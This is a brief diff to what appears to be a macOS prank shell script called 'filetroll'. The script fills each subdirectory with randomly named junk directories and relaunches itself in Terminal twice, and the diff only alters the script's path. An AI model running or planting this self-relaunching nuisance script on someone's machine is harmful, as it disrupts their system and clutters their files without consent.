@@ -3,6 +3,6 @@
 for d in */ ; do
     mkdir huehuehuehue.$RANDOM.$RANDOM
 done
-open -a Terminal.app ~/filetroll
+open -a Terminal.app filetroll
 sleep 1
-open -a Terminal.app ~/filetroll
+open -a Terminal.app filetroll
